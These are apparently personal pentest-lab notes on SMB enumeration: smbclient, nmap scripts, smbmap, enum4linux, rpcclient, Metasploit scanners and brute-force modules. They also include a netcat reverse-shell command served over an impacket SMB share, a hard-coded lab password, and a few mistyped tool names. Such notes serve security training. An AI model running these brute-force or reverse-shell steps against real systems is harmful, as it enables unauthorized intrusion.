
![[Pasted image 20221208053454.png]]


# enumerating SMB 
```bash

# smbclient
smbclient -L //$IP/ ##to check for directories without logging in 
smbclient //$IP/Directory # login without auth
echo exit | smbclient -L \\\\[ip]
smbclient \\\\[ip]\\[share name]

# Others

Enumerate Hostname : nmblookup -A [ip] 

nmap --script smb-enum-shares -p 139,445 [ip] # Or smbb-enum-users

nmap --script smb-vuln* -p 139,445 [ip] # Check for Vulnerabilities - 

nmap --script smb-protocols -p 139,445 [ip] # Check for Vulnerabilities - 

smbmap -H [ip/hostname]

smbmap -u guest -p "" -d . -H IP

smbmap -H [ip/hostname]

Overall Scan - enum4linux -a [ip] 

smbver.sh [IP] (port) [Samba] # Manual Inspection

rpccclient -U "" -N IP
# Inside rpc
srvinfo # check info about target
enumdomusers # check users
lookupnames NAME # check for user 
enumdomgroups

# Metasploit
use auxiliary/scanner/smb/smb2
use auxiliary/scanner/smb/smb_version
use auxiliary/scanner/smb/smb_enumshares
use auxiliary/scanner/smb/pipe_auditor # pipe search

-U # Username
-N #Force to not use password aka NULL session attack
get flag_1 - # read file
```
	

# Nbtstat ( Windows )
![[Pasted image 20221123163002.png]]
```powershell
nbtstat -A <IP>

Unique # Only 1 Ip assigned to the machine
<00>   # Workstation 
<20>   # File share is running 

```

## NET VIEW 

![[Pasted image 20221123163219.png]]
```
NET VIEW <target IP>
```

## Linux
![[Pasted image 20221123163345.png]]
```bash
nmblookup -A <Target IP>

```


# SMB server
smbserver.py NAME $(DIR) -smb2support -user USER -password password
exde1234
```
smbserver.py share DIRECTORY # Start Smbserver



# Connect back to smb server (Windows)

\\IP\SHARE\nc.exe -e cmd.exe IP PORT
```




# connect smb windows
$pass = convertto-securestring 'exde1234' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential ('super', $pass)
New-PSDrive -Name super -PSProvider FileSystem -Credential $cred -Root \\10.10.17.185\super


# Download everything in share

```
prompt off
recurse on
ls
mget *
```

# Brute-Force 

```bash
# Metasploit
use axuilary/scanner/smbb/smb_login # bruteforce 
```

# Check for shares permissions

```
smbmap -H demo.ine.local
```

# Enum4linux
```bash
enum4linux -s ~/Desktop/wordlists/100-common-passwords.txt demo.ine.local # brute force directory name

enum4linux -U <IP> # enum users

-P # Password policy
-o # OS info
-l # ldap
-a # ALL 

```